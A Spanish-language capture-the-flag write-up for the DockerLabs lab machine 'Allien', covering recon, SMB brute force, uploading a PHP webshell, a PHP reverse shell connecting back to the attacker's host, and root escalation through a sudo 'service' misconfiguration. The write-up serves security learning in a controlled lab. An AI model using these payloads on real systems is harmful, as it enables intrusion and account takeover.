@@ -1,0 +1,272 @@
+---
+title: Allien
+description: Resolución completa de la máquina virtual *Allien* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Allien**, desarrollada por *Luisillo_o* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone múltiples servicios, incluyendo HTTP, SSH y SMB. A través de la enumeración SMB se identifican usuarios y se obtienen credenciales mediante fuerza bruta. Estas credenciales permiten acceder a recursos compartidos que contienen información sensible, incluyendo credenciales de otros usuarios.
+Con acceso al usuario `administrador`, se descubre que el directorio compartido aloja la raíz del servidor web, permitiendo la subida de una webshell que otorga ejecución remota de comandos como `www-data`. Tras obtener una reverse shell, se identifica una configuración insegura de `sudo` que permite ejecutar el binario `service` como root, facilitando una escalada de privilegios inmediata hasta obtener acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Allien',
+    Autor: 'Luisillo_o',
+    Dificultad: 'Fácil',
+    Fecha: '10/10/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Allien.zip
+sudo bash auto_deploy.sh Allien.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Allien/{content,exploits,nmap,scripts}
+cd Allien
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+* **139/tcp** — SMB
+* **445/tcp** — SMB
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1755417921/Ports_ooomeg.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80,139,445 172.17.0.2 -oN targeted
+```
+
+![Servicios detectados](https://res.cloudinary.com/dewqswzke/image/upload/v1755417925/Services_tupg0e.png)
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1755417917/Gobuster_ozbqq4.png)
+
+**Rutas encontradas:**
+* **Index** — Login simple sin vulnerabilidades visibles.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1755417918/Login_lsawiz.png)
+* **info.php** — Información de configuración PHP.
+  ![info php](https://res.cloudinary.com/dewqswzke/image/upload/v1755417921/PhpInfo_sgmngh.png)
+* **productos.php** — Página de tienda.
+  ![productos](https://res.cloudinary.com/dewqswzke/image/upload/v1755417921/Products.php_wiujoz.png)
+
+---
+
+### 1.4 Enumeración SMB
+
+Se utiliza `enum4linux` para descubrir usuarios y directorios compartidos:
+
+```bash
+enum4linux 172.17.0.2
+```
+
+**Usuarios identificados:**
+![Users samba](https://res.cloudinary.com/dewqswzke/image/upload/v1755417914/SmbUsers_rgxa6d.png)
+
+**Carpetas compartidas:**
+![Dir samba](https://res.cloudinary.com/dewqswzke/image/upload/v1755417914/SmbCarpetas_cuhvbu.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Ataque sobre Samba
+
+Se detecta al usuario `satriani7` y se realiza fuerza bruta con `crackmapexec`:
+
+```bash
+crackmapexec smb 172.17.0.2 -u satriani7 -p /usr/share/wordlists/rockyou.txt
+```
+
+![password satrian](https://res.cloudinary.com/dewqswzke/image/upload/v1755417916/CrackMa_j9b2si.png)
+
+Se listan los **shares** accesibles:
+
+```bash
+smbclient -L //172.17.0.2 -U satriani7
+```
+
+![shares smb satrian](https://res.cloudinary.com/dewqswzke/image/upload/v1755417925/Shares_kqh1tq.png)
+
+Se conecta al servicio SMB:
+
+```bash
+smbclient //172.17.0.2/Documents -U satriani7
+```
+
+![samba client](https://res.cloudinary.com/dewqswzke/image/upload/v1755417923/Satrian_e6uja2.png)
+
+En `Documents/Personal` se encuentran:
+- `Notes.txt` — sin información útil.
+  ![nada importante](https://res.cloudinary.com/dewqswzke/image/upload/v1755417919/Notes.txt_xzaccn.png)
+- `Credentials.txt` — credenciales de usuarios.
+  ![passwords](https://res.cloudinary.com/dewqswzke/image/upload/v1755417917/Credentials.txt_kxnw05.png)
+
+### 2.2 Webshell (RCE)
+
+Se prueban las credenciales del usuario `administrador`. Se confirma el acceso a los shares:
+
+```bash
+smbclient //172.17.0.2/ADMINISTRADOR -U administrador
+```
+
+![shares administrador](https://res.cloudinary.com/dewqswzke/image/upload/v1755417927/SharesRoot_pl3yuw.png)
+
+Se confirma que allí se aloja la raíz del servidor web. Se sube una **webshell**:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+![webshell](https://res.cloudinary.com/dewqswzke/image/upload/v1755417915/WebShell_c11pl1.png)
+
+### 2.3 Reverse Shell
+
+Se abre un puerto en la máquina atacante:
+
+```bash
+nc -nlvp 443
+```
+
+Se ejecuta el comando con PHP en la webshell:
+
+```bash
+curl "http://172.17.0.2/shell.php?cmd=php%20-r%20'$sock=fsockopen(\"172.17.0.1\",443);exec(\"sh%20<%263%20>%263%202>%263\");'"
+```
+
+O desde la webshell:
+
+```php
+php -r '$sock=fsockopen("172.17.0.1",443);exec("sh <&3 >&3 2>&3");'
+```
+
+![ReverseShell](https://res.cloudinary.com/dewqswzke/image/upload/v1755417922/ReverseShell_ja5xyt.png)
+
+Se obtiene conexión activa como **www-data**:
+![www-data](https://res.cloudinary.com/dewqswzke/image/upload/v1755417919/Nc_lmiswu.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1755417915/Sudo-L_cqiwuj.png)
+
+El usuario puede ejecutar `/usr/bin/service` como root sin necesidad de contraseña.
+
+Se utiliza `searchbins` para verificar si existe una ruta en GTFOBins:
+
+```bash
+searchbins -b service -f sudo
+```
+
+![SearchBins](https://res.cloudinary.com/dewqswzke/image/upload/v1755417924/SearchBins_ofwdkv.png)
+
+Se ejecuta el siguiente comando para obtener una shell con privilegios de root:
+
+```bash
+sudo service ../../bin/sh
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1755417923/Root_bahw01.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Acceso anónimo a SMB con credenciales débiles",
+      severity: "Alta",
+      impact: "Exposición de archivos con información sensible"
+    },
+    {
+      vulnerability: "Credenciales almacenadas en texto plano",
+      severity: "Crítica",
+      impact: "Compromiso de cuentas de usuario y administrador"
+    },
+    {
+      vulnerability: "Subida de archivos no restringida en servidor web",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como www-data"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en service",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    },
+    {
+      vulnerability: "Falta de validación de entrada en webshell",
+      severity: "Alta",
+      impact: "Compromiso total del sistema"
+    }
+  ]}
+/>
